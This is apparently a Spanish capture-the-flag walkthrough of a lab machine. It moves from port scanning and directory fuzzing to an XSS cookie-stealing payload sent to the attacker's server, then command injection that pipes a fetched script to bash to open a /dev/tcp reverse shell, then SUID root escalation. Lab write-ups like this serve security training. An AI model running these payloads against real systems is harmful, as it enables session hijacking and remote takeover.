
Primero realzaremos un escaneo de puertos con nmap.
`sudo nmap -sV -sC --min-rate 7000 -p- -Pn 10.10.11.8 -oN escaneo`
<img src="Pasted image 20240424100119.png">

Seguidamente al ver que esconde el puerto 5000, para ello introducimos la ip seguida de dos puntos con el puerto.
<img src="Pasted image 20240424100249.png">

Vemos que esconde una web. Para ello haremos un fuzzing con dirsearch.
`dirsearch -u http://10.10.11.8:5000/`
<img src="Pasted image 20240424100701.png">

Entraremos a ver que esconde la pagina support.
<img src="Pasted image 20240424100826.png">

Veamos que tiene un formulario, veremos que hace si se lo rellenamos todo.
<img src="Pasted image 20240424101018.png">

Que hay un overflow, cuando sucede esto, podemos atacarlo con XSS. Para ello abriremos burpsuite para interceptar la petición al servidor.
<img src="Pasted image 20240424101405.png">

Una vez no tenemos, volveremos a nuestra consola, y abriremos un servidor python para que nos mande la cookie de sesión de administrador a nuestra máquina.
`python3 -m http.server 80`
<img src="Pasted image 20240424101532.png">

Una vez estamos a la escucha, volveremos al burpsuite y pondremos la siguinte sintaxis de JavsScript en "User Agent" y en el el mensaje de abajo. 
`<img src=x onerror=fetch('http://10.10.14.68/?c='+document.cookie);>`
<img src="Pasted image 20240424101911.png">

Lo mandaremos al repeter y lo enviaremos al rervidor, si todo va bien, en menos de un minuto nos tiene que dar la cookie de sesión en el servidor python.
<img src="Pasted image 20240424102247.png">
Al ver este mensaje, es buena señal, así que iremos la consola y esperaremos un minuto.
<img src="Pasted image 20240424102342.png">

Nos guardaremos la cookie para luego poder suplantarla. Cerraremos el burpsuite y volveremos a la paguina inicial de la web. Retomando el fuzzing de antes, a parte de suport, teniamos una página llamada dashboard, entraremos en ella.
<img src="Pasted image 20240424102646.png">

Nos sale que no estamos autorizados, pero no hay problema porque tenemos la cookie de administrador, asi que solo nos queda suplantarla. Para ello iremos a inspeccionar --> storage.
<img src="Pasted image 20240424102839.png">

Alli pegamos la nueva cookie en la que hay, de tal forma que se sobreescriba.
<img src="Pasted image 20240424102927.png">

Reiniciaremos la página. Y veremos la página al 100%, ahora intentaremos poder conseguir la shell del servidor, para ello vamos a interceptar la peticion con burpsuite.
<img src="Pasted image 20240424103730.png]]

Irmos al la consola y crearemos un harchivo html con contenido bash para poder ejecutar una reverse shell en el servidor.
`#!/bin/bash`
`sh -i >& /dev/tcp/10.10.14.68/4444 0>&1`
<img src="Pasted image 20240424103933.png">

Una vez lo tengamos, volveremos a encender un servidor python para poder hostear el archivo.
<img src="Pasted image 20240424104216.png">

Abriremos otro terminal y nos pondremos a la escucha con netcat en el puerto que hemos elegido.
`nc -lvnp 4444`
<img src="Pasted image 20240424104342.png">

Una vez lo tenemos, iremos al burpsuite y en date pondremos un ";" y pondremos el siguiente comando , lo mandaremos al repeter y lo enviaremos, con esto tendremos la shell.
`curl 10.10.14.68/index.html | bash`
<img src="Pasted image 20240424104600.png">
<img src="Pasted image 20240424104625.png">
Si al darle a enviar el botón send se nos pone de color gris, sera buena señal porque tendremos la shell.
<img src="Pasted image 20240424104714.png">
En el dolar escribiremos el siguiente comando para ver la ruta.
`script /dev/null -c bash`
<img src="Pasted image 20240424104823.png">

Con esto ya estaremos dentro, ahora buscaremos la flag de usuario.
<img src="Pasted image 20240424105032.png">

Una vez la tenemos, solo nos quedará escalar privilegios, para ello vermos que binarios tienen permiso de root. 
`sudo -l`
<img src="Pasted image 20240424105222.png">

Vemos que tiene este binario con permisos de administrador. Miraremos el contenido del binario para ver si obtenemos una pista.
`strings /usr/bin/syscheck`
<img src="Pasted image 20240424105522.png">

Vemos que tiene un archivo bash, le añadiremos el script `chmod u+s /bin/bash` dentro de el archivo para poder ejecutar lo que queramos. Para ello haremos:
`echo "chmod u+s /bin/bash">initdb.sh`
<img src="Pasted image 20240424110607.png">

Seguidamente, le daremos permisos al archivo bash y lo ejecutaremos.
<img src="Pasted image 20240424110733.png">

Finalmente lo ejecutaremos.
`./initdb.sh`
<img src="Pasted image 20240424111034.png">
Finalmente ejecutaremos un comando mas para tener acceso root.
`/bin/bash -p`
<img src="Pasted image 20240424111222.png">
